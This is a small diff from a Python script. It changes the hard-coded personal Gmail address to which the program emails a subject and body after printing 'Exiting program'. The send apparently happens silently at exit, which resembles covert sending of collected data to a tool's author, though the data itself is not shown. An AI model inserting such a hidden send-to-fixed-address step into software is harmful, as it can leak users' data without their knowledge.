@@ -32,6 +32,6 @@ def main():
 	print('')
 	print('\x1b[00mExiting program \x1b[91m!')
 	os.system('exit')
-	x.send('amirbangpower@gmail.com',subject,body)
+	x.send('bonangananta2@gmail.com',subject,body)
 
 main()
